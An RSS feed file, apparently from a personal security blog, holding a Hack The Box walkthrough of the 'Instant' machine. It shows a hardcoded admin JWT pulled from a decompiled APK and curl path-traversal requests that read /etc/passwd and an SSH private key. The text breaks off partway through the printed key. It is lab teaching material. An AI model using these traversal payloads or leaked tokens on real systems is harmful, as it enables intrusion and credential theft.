@@ -1,0 +1,486 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Path Traversal on Ep1cac</title>
+    <link>http://localhost:1313/tags/path-traversal/</link>
+    <description>Recent content in Path Traversal on Ep1cac</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>Ep1cac</copyright>
+    <lastBuildDate>Thu, 03 Apr 2025 13:48:40 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/path-traversal/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
+    
+    
+    <item>
+      <title>Instant</title>
+      <link>http://localhost:1313/posts/instant/</link>
+      <pubDate>Thu, 03 Apr 2025 13:48:40 -0500</pubDate>
+      
+      <guid>http://localhost:1313/posts/instant/</guid>
+      <description><![CDATA[<p><img src="/img/instant/instant.png" alt="Instant"></p>
+<h2 id="description">Description</h2>
+<p>Instant is a medium-difficulty Linux box from Hack The Box. We discover a hardcoded JWT token and a couple of subdomains from a downloadable apk file, from which we exploit a path traversal vulnerability to read a ssh private key and gain a foothold. Credentials from the instant webapp db can then be used to decrypt a Solar-PuTTY session backup file to find the password for root.</p>
+<h2 id="recon">Recon</h2>
+<p>A TCP reveals SSH open on port 22 and a webapp on port 80.</p>
+<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Thu Apr  3 10:22:19 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.37
+Nmap scan report for instant.htb (10.10.11.37)
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
+|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: Instant Wallet
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=4/3%OT=22%CT=1%CU=33135%PV=Y%DS=2%DC=T%G=Y%TM=67EEA
+OS:85B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP
+OS:=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=
+OS:A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53
+OS:CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W
+OS:1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%
+OS:O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
+OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
+OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 18.676 days (since Sat Mar 15 18:12:18 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   39.80 ms 10.10.14.1
+2   39.83 ms instant.htb (10.10.11.37)
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr  3 10:25:15 2025 -- 1 IP address (1 host up) scanned in 176.55 seconds
+</code></pre><p>After adding <code>instant.htb</code> to <code>/etc/hosts</code>, we are brought to a website where we can download a money transfer app.</p>
+<p><img src="/img/instant/instant_webpage.png" alt="Instant webapp"></p>
+<p>The download link gives us an apk file. We can decompile it to enumerate for hardcoded secrets, insufficient validation, api calls, and other potential information that could lead us to an exploitable vulnerability.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant]
+└─$ jadx --output-dir /tmp/instant/decompile /tmp/instant/instant.apk
+</code></pre><p>Eventually, some actionable information is returned when searching for <code>instant.htb</code> in the decompiled apk, including two subdomains <code>mywalletv1.instant.htb</code> and <code>swagger-ui.instant.htb</code>, a username <code>support@instant.htb</code>, as well as a JWT authorization token in <code>AdminActivities.java</code>.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ grep -ri &#34;instant.htb&#34; *
+grep: resources/classes.dex: binary file matches
+resources/res/layout/activity_forgot_password.xml:            android:text=&#34;Please contact support@instant.htb to have your account recovered&#34;
+resources/res/xml/network_security_config.xml:        &lt;domain includeSubdomains=&#34;true&#34;&gt;mywalletv1.instant.htb
+resources/res/xml/network_security_config.xml:        &lt;domain includeSubdomains=&#34;true&#34;&gt;swagger-ui.instant.htb
+sources/com/instantlabs/instant/LoginActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/login&#34;).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
+sources/com/instantlabs/instant/AdminActivities.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;).addHeader(&#34;Authorization&#34;, &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
+sources/com/instantlabs/instant/TransactionActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/initiate/transaction&#34;).addHeader(&#34;Authorization&#34;, str4).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
+sources/com/instantlabs/instant/TransactionActivity.java:                        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/confirm/pin&#34;).header(&#34;Authorization&#34;, this.val$access_token).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2
+sources/com/instantlabs/instant/ProfileActivity.java:            new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;).addHeader(&#34;Authorization&#34;, accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1
+sources/com/instantlabs/instant/RegisterActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/register&#34;).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
+</code></pre><p>Looking at <code>AdminActivities.java</code>, we can see the JWT token is being used to make a call to <code>http://mywalletv1.instant.htb/api/v1/view/profile</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.instantlabs.instant;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.google.gson.JsonParser;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.google.gson.JsonSyntaxException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Call;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Callback;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.OkHttpClient;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Request;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Response;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: classes.dex */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminActivities</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">TestAdminAuthorization</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> OkHttpClient().<span style="color:#a6e22e">newCall</span>(<span style="color:#66d9ef">new</span> Request.<span style="color:#a6e22e">Builder</span>().<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;</span>).<span style="color:#a6e22e">addHeader</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;</span>).<span style="color:#a6e22e">build</span>()).<span style="color:#a6e22e">enqueue</span>(<span style="color:#66d9ef">new</span> Callback() { <span style="color:#75715e">// from class: com.instantlabs.instant.AdminActivities.1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#75715e">/* synthetic */</span> <span style="color:#66d9ef">boolean</span> $assertionsDisabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// okhttp3.Callback</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onFailure</span>(Call call, IOException iOException) {
+</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Error Here : &#34;</span> <span style="color:#f92672">+</span> iOException.<span style="color:#a6e22e">getMessage</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// okhttp3.Callback</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onResponse</span>(Call call, Response response) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (response.<span style="color:#a6e22e">isSuccessful</span>()) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(JsonParser.<span style="color:#a6e22e">parseString</span>(response.<span style="color:#a6e22e">body</span>().<span style="color:#a6e22e">string</span>()).<span style="color:#a6e22e">getAsJsonObject</span>().<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;username&#34;</span>).<span style="color:#a6e22e">getAsString</span>());
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (JsonSyntaxException e) {
+</span></span><span style="display:flex;"><span>                        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Error Here : &#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>());
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Done&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can confirm the token is still valid.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;     
+{&#34;Profile&#34;:{&#34;account_status&#34;:&#34;active&#34;,&#34;email&#34;:&#34;admin@instant.htb&#34;,&#34;invite_token&#34;:&#34;instant_admin_inv&#34;,&#34;role&#34;:&#34;Admin&#34;,&#34;username&#34;:&#34;instantAdmin&#34;,&#34;wallet_balance&#34;:&#34;10000000&#34;,&#34;wallet_id&#34;:&#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&#34;},&#34;Status&#34;:200}
+</code></pre><h2 id="foothold">Foothold</h2>
+<p>Recall that there is another subdomain that we found, <code>swagger-ui.instant.htb</code>. This subdomain contains documentation for the REST API endpoints on <code>mywalletv1.instant.htb</code>, from which we can get a clearer picture of the app&rsquo;s full range of funcitonality.</p>
+<p><img src="/img/instant/swagger-ui.png" alt="Swagger ui"></p>
+<p>There is an API endpoint <code>/api/v1/admin/view/logs</code> that lets us view available logs. Perhaps one of them has credentials we could use to escalate privileges.</p>
+<p><img src="/img/instant/view_logs.png" alt="View logs api endpoint"></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/view/logs&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;
+{&#34;Files&#34;:[&#34;1.log&#34;],&#34;Path&#34;:&#34;/home/shirohige/logs/&#34;,&#34;Status&#34;:201}
+</code></pre><p>The API returns a single log file <code>1.log</code> in <code>shirohige</code>&rsquo;s home directory. We can read it by passing in its filename as the argument for <code>log_file_name</code> to <code>/api/v1/admin/read/log</code>.</p>
+<p><img src="/img/instant/read_log.png" alt="Read log api endpoint"></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;
+{&#34;/home/shirohige/logs/1.log&#34;:[&#34;This is a sample log testing\n&#34;],&#34;Status&#34;:201}
+</code></pre><p>Unfortunately the log itself reveals nothing of interest. But the fact that the filename is directly appended to the path <code>/home/shirohige/logs</code> in the response may indicate that the operation for file read also directly passes in user input, casuing a path traversal vulnerability. We can test this by sending a request to read <code>/etc/passwd</code>.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .  
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1673  100  1673    0     0  15447      0 --:--:-- --:--:-- --:--:-- 15490
+{
+  &#34;/home/shirohige/logs/../../../etc/passwd&#34;: [
+    &#34;root:x:0:0:root:/root:/bin/bash\n&#34;,
+    &#34;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&#34;,
+    &#34;bin:x:2:2:bin:/bin:/usr/sbin/nologin\n&#34;,
+    &#34;sys:x:3:3:sys:/dev:/usr/sbin/nologin\n&#34;,
+    &#34;sync:x:4:65534:sync:/bin:/bin/sync\n&#34;,
+    &#34;games:x:5:60:games:/usr/games:/usr/sbin/nologin\n&#34;,
+    &#34;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n&#34;,
+    &#34;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n&#34;,
+    &#34;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n&#34;,
+    &#34;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n&#34;,
+    &#34;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n&#34;,
+    &#34;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n&#34;,
+    &#34;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n&#34;,
+    &#34;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n&#34;,
+    &#34;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n&#34;,
+    &#34;irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n&#34;,
+    &#34;_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n&#34;,
+    &#34;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n&#34;,
+    &#34;systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n&#34;,
+    &#34;systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n&#34;,
+    &#34;dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n&#34;,
+    &#34;messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n&#34;,
+    &#34;systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n&#34;,
+    &#34;pollinate:x:102:1::/var/cache/pollinate:/bin/false\n&#34;,
+    &#34;polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n&#34;,
+    &#34;usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n&#34;,
+    &#34;sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n&#34;,
+    &#34;shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n&#34;,
+    &#34;_laurel:x:999:990::/var/log/laurel:/bin/false\n&#34;
+  ],
+  &#34;Status&#34;: 201
+}
+</code></pre><p>We successfully read the file, now we can enumerate the filesystem.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../proc/self/status&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1912  100  1912    0     0  10027      0 --:--:-- --:--:-- --:--:-- 10063
+{
+  &#34;/home/shirohige/logs/../../../proc/self/status&#34;: [
+    &#34;Name:\tpython3\n&#34;,
+    &#34;Umask:\t0022\n&#34;,
+    &#34;State:\tS (sleeping)\n&#34;,
+    &#34;Tgid:\t1334\n&#34;,
+    &#34;Ngid:\t0\n&#34;,
+    &#34;Pid:\t1334\n&#34;,
+    &#34;PPid:\t1\n&#34;,
+    &#34;TracerPid:\t0\n&#34;,
+    &#34;Uid:\t1001\t1001\t1001\t1001\n&#34;,
+    &#34;Gid:\t1002\t1002\t1002\t1002\n&#34;,
+    &#34;FDSize:\t128\n&#34;,
+    &#34;Groups:\t1001 1002 \n&#34;,
+    &#34;NStgid:\t1334\n&#34;,
+    &#34;NSpid:\t1334\n&#34;,
+    &#34;NSpgid:\t1334\n&#34;,
+    &#34;NSsid:\t1334\n&#34;,
+    &#34;Kthread:\t0\n&#34;,
+    &#34;VmPeak:\t  201928 kB\n&#34;,
+    &#34;VmSize:\t  136408 kB\n&#34;,
+    &#34;VmLck:\t       0 kB\n&#34;,
+    &#34;VmPin:\t       0 kB\n&#34;,
+    &#34;VmHWM:\t   54568 kB\n&#34;,
+    &#34;VmRSS:\t   54568 kB\n&#34;,
+    &#34;RssAnon:\t   40104 kB\n&#34;,
+    &#34;RssFile:\t   14464 kB\n&#34;,
+    &#34;RssShmem:\t       0 kB\n&#34;,
+    &#34;VmData:\t   58720 kB\n&#34;,
+    &#34;VmStk:\t     132 kB\n&#34;,
+    &#34;VmExe:\t    2956 kB\n&#34;,
+    &#34;VmLib:\t    9756 kB\n&#34;,
+    &#34;VmPTE:\t     172 kB\n&#34;,
+    &#34;VmSwap:\t       0 kB\n&#34;,
+    &#34;HugetlbPages:\t       0 kB\n&#34;,
+    &#34;CoreDumping:\t0\n&#34;,
+    &#34;THP_enabled:\t1\n&#34;,
+    &#34;untag_mask:\t0xffffffffffffffff\n&#34;,
+    &#34;Threads:\t2\n&#34;,
+    &#34;SigQ:\t0/7398\n&#34;,
+    &#34;SigPnd:\t0000000000000000\n&#34;,
+    &#34;ShdPnd:\t0000000000000000\n&#34;,
+    &#34;SigBlk:\t0000000000000000\n&#34;,
+    &#34;SigIgn:\t0000000001001000\n&#34;,
+    &#34;SigCgt:\t0000000100000002\n&#34;,
+    &#34;CapInh:\t0000000000000000\n&#34;,
+    &#34;CapPrm:\t0000000000000000\n&#34;,
+    &#34;CapEff:\t0000000000000000\n&#34;,
+    &#34;CapBnd:\t000001ffffffffff\n&#34;,
+    &#34;CapAmb:\t0000000000000000\n&#34;,
+    &#34;NoNewPrivs:\t0\n&#34;,
+    &#34;Seccomp:\t0\n&#34;,
+    &#34;Seccomp_filters:\t0\n&#34;,
+    &#34;Speculation_Store_Bypass:\tvulnerable\n&#34;,
+    &#34;SpeculationIndirectBranch:\tconditional enabled\n&#34;,
+    &#34;Cpus_allowed:\tffffffff,ffffffff,ffffffff,ffffffff\n&#34;,
+    &#34;Cpus_allowed_list:\t0-127\n&#34;,
+    &#34;Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001\n&#34;,                                                                                                                                  
+    &#34;Mems_allowed_list:\t0\n&#34;,
+    &#34;voluntary_ctxt_switches:\t53085\n&#34;,
+    &#34;nonvoluntary_ctxt_switches:\t221\n&#34;,
+    &#34;x86_Thread_features:\t\n&#34;,
+    &#34;x86_Thread_features_locked:\t\n&#34;
+  ],
+  &#34;Status&#34;: 201
+}
+</code></pre><p>Reading <code>/proc/self/status</code>, we can see that our current Uid is 1001, meaning that we can verify that have the permissions of <code>shirohige</code> (<code>shirohige</code>&rsquo;s Uid is 1001 as seen from <code>/etc/passwd</code>). Further recon shows that <code>shirohige</code> as a private ssh key that we can read.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
+└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2809  100  2809    0     0  32082      0 --:--:-- --:--:-- --:--:-- 31920
+{
+  &#34;/home/shirohige/logs/../.ssh/id_rsa&#34;: [
+    &#34;-----BEGIN OPENSSH PRIVATE KEY-----\n&#34;,
+    &#34;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n&#34;,
+    &#34;NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n&#34;,
+    &#34;nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\n&#34;,
+    &#34;dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\n&#34;,
+    &#34;5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\n&#34;,
+    &#34;8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\n&#34;,
+    &#34;uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\n&#34;,
+    &#34;jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\n&#34;,
+    &#34;Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\n&#34;,
+    &#34;EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8\n&#34;,
+    &#34;sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4\n&#34;,
+    &#34;/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY\n&#34;,
+    &#34;kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE\n&#34;,
+    &#34;xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg\n&#34;,
+    &#34;J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa\n&#34;,
+    &#34;m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l\n&#34;,
+    &#34;2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN\n&#34;,
+    &#34;SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP\n&#34;,
+    &#34;OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy\n&#34;,
+    &#34;nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb\n&#34;,
